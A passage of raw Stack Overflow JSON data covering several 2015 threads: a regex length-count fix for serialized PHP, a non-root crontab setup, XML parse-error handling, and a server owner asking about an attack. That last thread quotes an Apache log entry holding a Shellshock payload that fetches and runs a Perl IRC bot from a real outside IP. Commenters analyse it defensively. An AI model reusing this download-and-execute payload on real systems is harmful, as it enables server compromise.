{"reputation": 610, "user_id": 147126, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/10b9c58599ec50d176fa2ce8c2d8bd88?s=128&d=identicon&r=PG", "display_name": "Tanner", "link": "https://stackoverflow.com/users/147126/tanner"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1446841384, "post_id": 33574414, "comment_id": 54928163, "body": "@ThisSuitIsBlackNot You got it. This is a serialized PHP object so to modify the string I also need to modify the length count, and the modification I want to do is remove the <a href=\"https://ipaddr/\" rel=\"nofollow noreferrer\">ipaddr</a> and leave the rest of the request URL. In this case, the length of <a href=\"https://ipaddr/\" rel=\"nofollow noreferrer\">ipaddr</a> in my actual data is 21. I&#39;ll edit a bit more detail in"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1446841932, "post_id": 33574414, "comment_id": 54928428, "body": "The less hacky approach would be to deserialize the data, modify the value, serialize the data, and update the row. Is that not an option?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1446842115, "post_id": 33574414, "comment_id": 54928495, "body": "Maybe take a look at <a href=\"https://metacpan.org/pod/PHP::Serialization\" rel=\"nofollow noreferrer\">PHP::Serialization</a>."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1446870761, "post_id": 33574414, "comment_id": 54935675, "body": "Why does 21 - 21 equal 4?"}, {"owner": {"reputation": 610, "user_id": 147126, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/10b9c58599ec50d176fa2ce8c2d8bd88?s=128&d=identicon&r=PG", "display_name": "Tanner", "link": "https://stackoverflow.com/users/147126/tanner"}, "edited": false, "score": 0, "creation_date": 1447172582, "post_id": 33574414, "comment_id": 55043071, "body": "Why is this question being down voted with no explanations?"}], "answers": [{"tags": [], "owner": {"reputation": 62252, "user_id": 1435869, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TrEd9.jpg?s=128&g=1", "display_name": "karakfa", "link": "https://stackoverflow.com/users/1435869/karakfa"}, "is_accepted": false, "score": 0, "last_activity_date": 1446844130, "creation_date": 1446844130, "answer_id": 33575748, "question_id": 33574414, "link": "https://stackoverflow.com/questions/33574414/replacing-a-string-with-a-new-number-based-on-the-old-one-using-regex/33575748#33575748", "title": "Replacing a string with a new number based on the old one using regex", "body": "<p><code>awk</code> to the rescue!</p>\n\n<pre><code>$ awk -v FS=\"[:\\\"/]\" '/[0-9]+:\"https:\\/\\/[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+\\// \n{print $1-17 \":\\\"\" $(NF-1) \"\\\"\" }' file\n4:\"blah\"\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "is_accepted": true, "score": 2, "last_activity_date": 1446848287, "creation_date": 1446848287, "answer_id": 33576597, "question_id": 33574414, "link": "https://stackoverflow.com/questions/33574414/replacing-a-string-with-a-new-number-based-on-the-old-one-using-regex/33576597#33576597", "title": "Replacing a string with a new number based on the old one using regex", "body": "<p>What you're looking for is this:</p>\n\n<pre><code>perl -pe 's{^(\\d+)(:\")(https://[\\d.]+/)}{ ($1 - length($3)) . $2 }e' file\n</code></pre>\n\n<p>The key is the <code>e</code> modifier which evaluates the code in replacement part.</p>\n"}], "owner": {"reputation": 610, "user_id": 147126, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/10b9c58599ec50d176fa2ce8c2d8bd88?s=128&d=identicon&r=PG", "display_name": "Tanner", "link": "https://stackoverflow.com/users/147126/tanner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "accepted_answer_id": 33576597, "answer_count": 2, "score": -2, "last_activity_date": 1446913495, "creation_date": 1446838763, "last_edit_date": 1446913495, "question_id": 33574414, "link": "https://stackoverflow.com/questions/33574414/replacing-a-string-with-a-new-number-based-on-the-old-one-using-regex", "title": "Replacing a string with a new number based on the old one using regex", "body": "<p>I came up with this regex</p>\n\n<pre><code>[0-9]+:\"https:\\/\\/[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+\\/\n</code></pre>\n\n<p>which matches on this data</p>\n\n<pre><code>...\n21:\"https://10.0.0.0/blah\"\n...\n</code></pre>\n\n<p>and what I want to end up with is</p>\n\n<pre><code>...\n4:\"blah\"\n...\n</code></pre>\n\n<p>where the amount subtracted was the length of the https:// part. The number to be subtracted is constant, i.e the IP address is always the same so I'm looking for some sort of substitution like this pseudo regex</p>\n\n<pre><code>s|[0-9]+:\"https:\\/\\/[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+\\/|($1-17):\"|g\n</code></pre>\n\n<p>where 17 is the length, but I am having trouble coming up with something that would perform this. I think I need one of those magical perl one liners. This data is all in a MySQL DB as well, so I could possibly do something right in SQL, but am not familiar enough with grouping options and whether arithmetic would be possible on it in SQL.</p>\n\n<p>I also understand that regex's cannot do arithmetic (except for that magical one on SO)</p>\n\n<p>Perhaps AWK is best suited for this? I have never used AWK before though so would need to do some reading</p>\n"}, {"tags": ["python", "bash", "apache", "perl"], "comments": [{"owner": {"reputation": 1941, "user_id": 5186820, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/3054407a607bcfc6f7203280afd0aceb?s=128&d=identicon&r=PG&f=1", "display_name": "Brian", "link": "https://stackoverflow.com/users/5186820/brian"}, "edited": false, "score": 1, "creation_date": 1446828936, "post_id": 33571641, "comment_id": 54921524, "body": "You requested python - however, you might want to look at <code>inotifywait</code>.  I think what you want to do could be accomplished with a short command-line pipeline."}, {"owner": {"reputation": 9742, "user_id": 3848833, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/21958c044f4221396b316a0bdb70de4d?s=128&d=identicon&r=PG&f=1", "display_name": "cezar", "link": "https://stackoverflow.com/users/3848833/cezar"}, "edited": false, "score": 0, "creation_date": 1446828982, "post_id": 33571641, "comment_id": 54921543, "body": "I&#39;m not very sure, but eventually sockets could be used: <a href=\"https://docs.python.org/2/howto/sockets.html\" rel=\"nofollow noreferrer\">docs.python.org/2/howto/sockets.html</a>"}, {"owner": {"reputation": 9227, "user_id": 1830895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/I8Hvh.jpg?s=128&g=1", "display_name": "Pynchia", "link": "https://stackoverflow.com/users/1830895/pynchia"}, "edited": false, "score": 0, "creation_date": 1446829228, "post_id": 33571641, "comment_id": 54921683, "body": "Have a look at <a href=\"https://pymotw.com/2/dircache/\" rel=\"nofollow noreferrer\">dircache</a>"}, {"owner": {"reputation": 24966, "user_id": 2001031, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/bd4f0d39f82be9c22f6f01c80d7ad800?s=128&d=identicon&r=PG", "display_name": "Neil Slater", "link": "https://stackoverflow.com/users/2001031/neil-slater"}, "edited": false, "score": 2, "creation_date": 1446829350, "post_id": 33571641, "comment_id": 54921766, "body": "You are most likely not being stalked, just the server is on a list of places being probed for a known vulnerability by some script. See <a href=\"https://packetstormsecurity.com/files/127428/D-Link-info.cgi-POST-Request-Buffer-Overflow.html\" rel=\"nofollow noreferrer\">packetstormsecurity.com/files/127428/&hellip;</a> - the <code>cox.pl</code> is payload, and would run if you were affected by the vulnerability."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446829642, "post_id": 33571641, "comment_id": 54921944, "body": "There shouldn&#39;t be anything in <code>&#47;tmp</code> in the first place (as a result of this issue, that is), because you shouldn&#39;t be accepting arbitrary code via query string and <code>eval</code>-ing it!"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 3, "creation_date": 1446829921, "post_id": 33571641, "comment_id": 54922078, "body": "@Matt Jacob, The attack in question relies on a severe bug in <code>bash</code>. No <code>eval</code> involved."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 5, "creation_date": 1446829973, "post_id": 33571641, "comment_id": 54922103, "body": "Re &quot;I really want to know what is in &#39;cox.pl&#39;&quot;, So download it. Just don&#39;t run it."}, {"owner": {"reputation": 384453, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 2, "creation_date": 1446831020, "post_id": 33571641, "comment_id": 54922638, "body": "You&#39;ve made sure your shell isn&#39;t vulnerable to the Shellshock exploit so that your server isn&#39;t downloading the file in the first place, right?"}, {"owner": {"reputation": 103, "user_id": 5335178, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/ewZgO.jpg?s=128&g=1", "display_name": "jamiejackherer", "link": "https://stackoverflow.com/users/5335178/jamiejackherer"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1446831391, "post_id": 33571641, "comment_id": 54922869, "body": "@ikegami I have tried to wget cox.pl but <code>no route to host</code>, my guess is it is coming from a personal computer with dynamic IP changing. I cant ping the IP , I know its owned by &#39;Iliad Entreprises Customers&#39; an ISP in France, as who.is says it is. @neil slater I once played around with BackTrack4 a few years ago so I know an attempted hack when I see one, it wouldn&#39;t run if perl were not on my system (just as an e.g.)"}, {"owner": {"reputation": 103, "user_id": 5335178, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/ewZgO.jpg?s=128&g=1", "display_name": "jamiejackherer", "link": "https://stackoverflow.com/users/5335178/jamiejackherer"}, "reply_to_user": {"reputation": 384453, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 0, "creation_date": 1446831517, "post_id": 33571641, "comment_id": 54922945, "body": "@chepner I am fairly security minded so I continuasly check for major vulnerabilties (and less major ones) I always update to new versions anyway especially with something like ShellShock, thanks for that though."}, {"owner": {"reputation": 103, "user_id": 5335178, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/ewZgO.jpg?s=128&g=1", "display_name": "jamiejackherer", "link": "https://stackoverflow.com/users/5335178/jamiejackherer"}, "reply_to_user": {"reputation": 1941, "user_id": 5186820, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/3054407a607bcfc6f7203280afd0aceb?s=128&d=identicon&r=PG&f=1", "display_name": "Brian", "link": "https://stackoverflow.com/users/5186820/brian"}, "edited": false, "score": 0, "creation_date": 1446831636, "post_id": 33571641, "comment_id": 54923015, "body": "@Brian .. D&#39;oh forgot about <code>inotifywait</code>, I will look into that thanks."}, {"owner": {"reputation": 103, "user_id": 5335178, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/ewZgO.jpg?s=128&g=1", "display_name": "jamiejackherer", "link": "https://stackoverflow.com/users/5335178/jamiejackherer"}, "reply_to_user": {"reputation": 24966, "user_id": 2001031, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/bd4f0d39f82be9c22f6f01c80d7ad800?s=128&d=identicon&r=PG", "display_name": "Neil Slater", "link": "https://stackoverflow.com/users/2001031/neil-slater"}, "edited": false, "score": 0, "creation_date": 1446831845, "post_id": 33571641, "comment_id": 54923127, "body": "@Neil Slater are you trying to say D-Link-info.cgi-POST-Request-Buffer-Overflow is cox.pl? ..In this case I mean?"}, {"owner": {"reputation": 103, "user_id": 5335178, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/ewZgO.jpg?s=128&g=1", "display_name": "jamiejackherer", "link": "https://stackoverflow.com/users/5335178/jamiejackherer"}, "edited": false, "score": 0, "creation_date": 1446832939, "post_id": 33571641, "comment_id": 54923652, "body": "r.e looking into D-Link-info.cgi-POST-Request-Buffer-Overflow and only just realised my router is in fact a D-link router, I&#39;m pretty tired after researching this for a while. :/ Any Ideas on getting rid of the vulnerability?"}, {"owner": {"reputation": 24966, "user_id": 2001031, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/bd4f0d39f82be9c22f6f01c80d7ad800?s=128&d=identicon&r=PG", "display_name": "Neil Slater", "link": "https://stackoverflow.com/users/2001031/neil-slater"}, "edited": false, "score": 0, "creation_date": 1446832968, "post_id": 33571641, "comment_id": 54923671, "body": "@jamiejackherer: No. The overflow is the vulnerability inside <code>info.cgi</code>. It allows execution of arbitrary code. The code you see in the request, and does what you say in the question - downloads <code>cox.pl</code> and runs it. If you don&#39;t have the vulnerability (you may not even have a bad version of  <code>info.cgi</code> installed or active), then nothing happens, the request is denied, but the hacking script just keeps on trying. However, if you do have it, then <code>cox.pl</code> will have been run on your device many times already."}, {"owner": {"reputation": 103, "user_id": 5335178, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/ewZgO.jpg?s=128&g=1", "display_name": "jamiejackherer", "link": "https://stackoverflow.com/users/5335178/jamiejackherer"}, "edited": false, "score": 1, "creation_date": 1446835493, "post_id": 33571641, "comment_id": 54924946, "body": "Ahh That makes sense to me now, it&#39;s been a long time since I&#39;ve played about with hacking and such, it doesnt interest me now so I forgot a lot of simple terms and meanings. The <code>grep</code>ed log is on pastebin if anyones interested in looking, <a href=\"http://pastebin.com/dUyV9ZEr\" rel=\"nofollow noreferrer\">pastebin.com/dUyV9ZEr</a>"}, {"owner": {"reputation": 103, "user_id": 5335178, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/ewZgO.jpg?s=128&g=1", "display_name": "jamiejackherer", "link": "https://stackoverflow.com/users/5335178/jamiejackherer"}, "edited": false, "score": 0, "creation_date": 1446836551, "post_id": 33571641, "comment_id": 54925520, "body": "BINGO!!! I ran a while loop ( while sleep 20; do wget <a href=\"http://190.186.76.252/cox.pl\" rel=\"nofollow noreferrer\">190.186.76.252/cox.pl</a>; done) to see if the ip would ever come back online, and low and behold i have a copy of cox.pl now, they are running apache2.4 on a fedora box!"}, {"owner": {"reputation": 103, "user_id": 5335178, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/ewZgO.jpg?s=128&g=1", "display_name": "jamiejackherer", "link": "https://stackoverflow.com/users/5335178/jamiejackherer"}, "edited": false, "score": 0, "creation_date": 1446838305, "post_id": 33571641, "comment_id": 54926498, "body": "if anyones interested cox.pl .... <a href=\"http://pastebin.com/vq2NggDT\" rel=\"nofollow noreferrer\">pastebin.com/vq2NggDT</a>"}, {"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1446838998, "post_id": 33571641, "comment_id": 54926885, "body": "Looks like IRC client/remote shell written by someone with good hacking and poor perl skills. 123.196.116.66 irc server can be found on <a href=\"https://wq.apnic.net/whois-search/static/search.html\" rel=\"nofollow noreferrer\"><code>APNIC</code></a>"}, {"owner": {"reputation": 103, "user_id": 5335178, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/ewZgO.jpg?s=128&g=1", "display_name": "jamiejackherer", "link": "https://stackoverflow.com/users/5335178/jamiejackherer"}, "edited": false, "score": 0, "creation_date": 1446842713, "post_id": 33571641, "comment_id": 54928755, "body": "&quot; good hacking and poor perl skills&quot; made me LOL"}, {"owner": {"reputation": 103, "user_id": 5335178, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/ewZgO.jpg?s=128&g=1", "display_name": "jamiejackherer", "link": "https://stackoverflow.com/users/5335178/jamiejackherer"}, "reply_to_user": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1446847477, "post_id": 33571641, "comment_id": 54930789, "body": "@\u0421\u0443\u0445\u043e\u043927 You say &#39;good hacker&#39; what makes you say that? Also I would guess the IP on my apache logs wont be the IP of the attacker (if he/she is that good), so likely to be from an already hacked box that they have pwned already?"}], "answers": [{"tags": [], "owner": {"reputation": 1985, "user_id": 1136400, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/x6MCZ.png?s=128&g=1", "display_name": "Doncho Gunchev", "link": "https://stackoverflow.com/users/1136400/doncho-gunchev"}, "is_accepted": false, "score": 1, "last_activity_date": 1446914688, "creation_date": 1446914688, "answer_id": 33585180, "question_id": 33571641, "link": "https://stackoverflow.com/questions/33571641/a-python-script-to-monitor-a-directory-for-new-files/33585180#33585180", "title": "A python script to monitor a directory for new files", "body": "<p>The script in question can be easily downloaded, it contains <code>ShellBOT by: devil__</code> so... guess ;-)</p>\n\n<p>You could use <a href=\"https://github.com/seb-m/pyinotify/blob/master/python2/examples/tutorial_notifier.py\" rel=\"nofollow\">tutorial_notifier.py</a> from <a href=\"https://github.com/seb-m/pyinotify/wiki\" rel=\"nofollow\">pyinotify</a>, but there's no need for this particular case. Just do </p>\n\n<pre><code>curl http://190.186.76.252/cox.pl -o cox.pl.txt\nless cox.pl.txt\n</code></pre>\n\n<p>to check the script.</p>\n\n<p>It looks like a good suite of hacks for Linux 2.4.17 - 2.6.17 and maybe BSD*, not that harmless to me, IRC related. It has nothing to do with <a href=\"https://github.com/dcraig/Cox-Data-Usage/blob/master/cox.pl\" rel=\"nofollow\">Cox-Data-Usage</a>.</p>\n"}], "owner": {"reputation": 103, "user_id": 5335178, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/ewZgO.jpg?s=128&g=1", "display_name": "jamiejackherer", "link": "https://stackoverflow.com/users/5335178/jamiejackherer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1687, "favorite_count": 0, "answer_count": 1, "score": 4, "last_activity_date": 1446914688, "creation_date": 1446828436, "last_edit_date": 1446830563, "question_id": 33571641, "link": "https://stackoverflow.com/questions/33571641/a-python-script-to-monitor-a-directory-for-new-files", "title": "A python script to monitor a directory for new files", "body": "<p>Similar questions have been asked but they either did not work for me or I failed to understand the answers. </p>\n\n<p>I run Apache2 webserver and host a few petty personal sites. I am being <em>cyberstalked</em>, or someone is attempting to hack me.  </p>\n\n<p>The Apache2 access log shows</p>\n\n<blockquote>\n  <p>195.154.80.205 - - [05/Nov/2015:09:57:09 +0000] \"GET /info.cgi HTTP/1.1\" 404 464 \"-\" \"() { :;};/usr/bin/perl -e 'print \\\"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\\\";system(\\\"wget <a href=\"http://190.186.76.252/cox.pl\" rel=\"nofollow\">http://190.186.76.252/cox.pl</a> -O /tmp/cox.pl;curl -O /tmp/cox.pl <a href=\"http://190.186.76.252/cox.pl;perl\" rel=\"nofollow\">http://190.186.76.252/cox.pl;perl</a> /tmp/cox.pl;rm -rf /tmp/cox.pl*\\\");'\"  </p>\n</blockquote>\n\n<p>which is clearly attempting (over and over again in my logs) to force my server to download 'cox.pl' then run 'cox.pl' then remove 'cox.pl'.</p>\n\n<p>I really want to know what is in <code>cox.pl</code> which could be a modified version of <a href=\"https://github.com/dcraig/Cox-Data-Usage/blob/master/cox.pl\" rel=\"nofollow\">Cox-Data-Usage</a> which is there on github.</p>\n\n<p>I would like a script that will constantly monitor my <code>/tmp</code> folder, and when a new file is added then copy that file to another directory for me to see what it is doing, or attempting to do at least.</p>\n\n<p>I know I could deny access etc. but I want to find out what these hackers are trying to do and see if I can gather intel about them.  </p>\n"}, {"tags": ["oracle", "perl", "crontab"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1446823424, "post_id": 33569743, "comment_id": 54918070, "body": "Depends on platform - check /etc/cron.allow and /etc/cron.deny"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1446825452, "post_id": 33569743, "comment_id": 54919396, "body": "Any time you have an issue with cron, the first thing to do is check the cron log to make sure 1) the cronjob actually ran and 2) there were no errors. On my system, the log is in /var/log/cron."}, {"owner": {"reputation": 1, "user_id": 3723302, "user_type": "registered", "profile_image": "https://graph.facebook.com/660910468/picture?type=large", "display_name": "user3723302", "link": "https://stackoverflow.com/users/3723302/user3723302"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447178820, "post_id": 33569743, "comment_id": 55047210, "body": "@Sobrique i added oracle the cron.allow file"}, {"owner": {"reputation": 1, "user_id": 3723302, "user_type": "registered", "profile_image": "https://graph.facebook.com/660910468/picture?type=large", "display_name": "user3723302", "link": "https://stackoverflow.com/users/3723302/user3723302"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1447178830, "post_id": 33569743, "comment_id": 55047218, "body": "@ThisSuitIsBlackNot i checked the log. I dont think the oracle crontab is running at all."}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1446824244, "post_id": 33569994, "comment_id": 54918606, "body": "Alternatively, you could add the job to <code>&#47;etc&#47;crontab</code>, which has an extra field which specifies as which user the job should run."}], "tags": [], "owner": {"reputation": 28131, "user_id": 1956010, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bfdcb4596e9da98cccbf9a0069fdff6c?s=128&d=identicon&r=PG", "display_name": "nwellnhof", "link": "https://stackoverflow.com/users/1956010/nwellnhof"}, "is_accepted": false, "score": 2, "last_activity_date": 1446823222, "creation_date": 1446823222, "answer_id": 33569994, "question_id": 33569743, "link": "https://stackoverflow.com/questions/33569743/creating-crontab-for-non-root-user/33569994#33569994", "title": "Creating crontab for non-root user", "body": "<p>Use <code>crontab</code>'s <code>-u</code> option. The <a href=\"http://man7.org/linux/man-pages/man1/crontab.1.html\" rel=\"nofollow\">man page</a> says:</p>\n\n<blockquote>\n  <p><code>-u</code> Appends the name of the user whose crontab is to be modified.\n                If this option is not used, crontab examines \"your\" crontab,\n                i.e., the crontab of the person executing the command.  Note\n                that su(8) may confuse crontab, thus, when executing commands\n                under su(8) you should always use the -u option.  If no\n                crontab exists for a particular user, it is created for him\n                the first time the crontab -u command is used under his\n                username.</p>\n</blockquote>\n\n<p>So the correct command is:</p>\n\n<pre><code>sudo crontab -e -u oracle\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 3723302, "user_type": "registered", "profile_image": "https://graph.facebook.com/660910468/picture?type=large", "display_name": "user3723302", "link": "https://stackoverflow.com/users/3723302/user3723302"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1104, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1446823222, "creation_date": 1446822434, "question_id": 33569743, "link": "https://stackoverflow.com/questions/33569743/creating-crontab-for-non-root-user", "title": "Creating crontab for non-root user", "body": "<p>I am attempting to run a script through crontab that is required to run as an <em>oracle</em> user.  I have tried creating a crontab for that user by: \n<code>su -u oracle crontab -e</code> which has allowed me to create one.  I edited the file to run a perl script:</p>\n\n<pre><code>0 5 * * * /usr/bin/perl /path/master.pl &gt; /tmp/debug.log\n</code></pre>\n\n<p>However when the time passes nothing is run.\nIs this the proper way to create a crontab for non-root user? Also the master.pl file call multiple scripts that also need to be done as a oracle user if that makes a difference. </p>\n"}, {"tags": ["xml", "perl", "xml-libxml"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1446821456, "post_id": 33568767, "comment_id": 54916814, "body": "Your question is very hard to understand. You have a list of files. You parse each of those. Do you want to skip a file if the XML is not valid, and continue parsing the next one?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user4128379"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1446821547, "post_id": 33568767, "comment_id": 54916892, "body": "Exactly and then print out the file name and go to the next file"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1446821607, "post_id": 33568767, "comment_id": 54916922, "body": "In that case, please add the code you have already written for the loop and the reading of the files. You can simplify it by removing things that are not relevant for the question, i.e. the actual processing. You can <a href=\"https://stackoverflow.com/posts/33568767/edit\">edit</a> the question."}], "answers": [{"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 5, "last_activity_date": 1446822125, "creation_date": 1446822125, "answer_id": 33569657, "question_id": 33568767, "link": "https://stackoverflow.com/questions/33568767/handling-the-xml-parser-error/33569657#33569657", "title": "Handling the xml parser error", "body": "<p>Wrap your parse operations in an <code>eval</code>, and trap <code>$@</code>. </p>\n\n<p>Using a library I know better:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings; \nuse XML::Twig; \n\nforeach my $file ( glob \"*.xml\") {\n     eval { XML::Twig -&gt; new() -&gt; parsefile ( $file ) }; \n     if ( $@ ) { \n          print \"$file not valid XML: $@\\n\"; \n     }\n     else {\n          print \"$file parsed successfully\\n\";\n     }\n}\n</code></pre>\n\n<p>This approach should work with most XML parsers in Perl, so is just illustrative. By design and spec, broken XML is supposed to be a fatal error. </p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4128379"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, 